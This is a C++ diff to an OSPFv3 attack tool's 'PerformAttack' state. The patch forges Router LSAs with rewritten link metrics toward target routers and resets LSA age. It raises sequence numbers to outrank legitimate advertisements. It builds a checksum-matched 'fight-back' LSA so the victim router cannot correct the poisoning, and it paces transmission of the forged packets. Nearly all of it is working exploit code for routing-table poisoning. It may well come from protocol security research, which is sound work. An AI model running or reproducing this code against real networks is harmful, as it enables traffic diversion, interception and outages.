@@ -17,6 +17,7 @@
 #include "parser/ospf/LinkStateUpdatePacket.h"
 #include "tinshelper.h"
 #include "parser/ospf/lsa/RouterLSAPacket.h"
+#include "util.h"
 #include <queue>
 
 namespace sc = boost::statechart;
@@ -337,6 +338,8 @@ namespace statemachine {
 			PerformAttack(my_context ctx) : my_base(ctx) {
 				logger->info("Performing attack.");
 				
+				std::queue<std::shared_ptr<parser::OSPFv3Packet>> sendQueue;
+				
 				for (auto const&[a, b, metric] : context<Machine>().targets) {
 					for (auto const &lsa : context<Machine>().lsas) {
 						if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA &&
@@ -356,16 +359,19 @@ namespace statemachine {
 								
 								auto interfaces = newRouterLSA->getInterfaces();
 								for (auto &interface : interfaces) {
-									if (interface.neighbor_router_id == dst) {
-										interface.metric = metric;
+									for (auto const&[a2, b2, metric2] : context<Machine>().targets) {
+										if (interface.neighbor_router_id == a2 || interface.neighbor_router_id == b2) {
+											interface.metric = metric2;
+										}
 									}
 								}
 								newRouterLSA->setInterfaces(interfaces);
 								
 								auto hdr = newLSA->getHeader();
-								hdr.seq++;
+								hdr.age = 0;
+								hdr.seq += 0x10;
 								newLSA->setHeader(hdr);
-								logger->trace("Forged LSA has seq {}.", hdr.seq);
+								logger->debug("Forged LSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
 							}
 							
 							auto origFBLSA = std::make_shared<parser::LSAPacket>(
@@ -375,16 +381,18 @@ namespace statemachine {
 							
 							{
 								auto origHdr = origFBLSA->getHeader();
-								origHdr.seq += 2;
+								origHdr.age = 0;
+								origHdr.seq += 0x11;
 								origFBLSA->setHeader(origHdr);
 								origFBLSA->updateValues();
 								
 								auto tgtChecksum = origFBLSA->getHeader().checksum;
 
 								auto hdr = newFBLSA->getHeader();
-								hdr.seq ++;
+								hdr.age = 0;
+								hdr.seq++;
 								newFBLSA->setHeader(hdr);
-								logger->trace("Forged FBLSA has seq {}.", hdr.seq);
+								logger->debug("Forged FBLSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
 								newFBLSA->updateValues();
 								
 								std::optional<std::shared_ptr<parser::LSAPacket>> yay = newFBLSA->modToChecksum(tgtChecksum);
@@ -400,6 +408,7 @@ namespace statemachine {
 									for (auto &interface : interfaces) {
 										if (interface.neighbor_router_id == dst) {
 											interface.metric++;
+											break;
 										}
 									}
 									newRouterLSA->setInterfaces(interfaces);
@@ -471,11 +480,21 @@ namespace statemachine {
 								forgedOSPFFBpkt->updateValues();
 							}
 							
-							forgedOSPFpkt->transmit();
-							forgedOSPFFBpkt->transmit();
+							sendQueue.push(forgedOSPFpkt);
+							sendQueue.push(forgedOSPFFBpkt);
 						}
 					}
 				}
+				
+				logger->debug("Sending {} packets...", sendQueue.size());
+				while (!sendQueue.empty()) {
+					sendQueue.front()->transmit();
+					sendQueue.pop();
+					if (!sendQueue.empty()) {
+						std::this_thread::sleep_for(1100ms);
+					}
+				}
+				logger->debug("Sent all packets.");
 			}
 		};
 	}
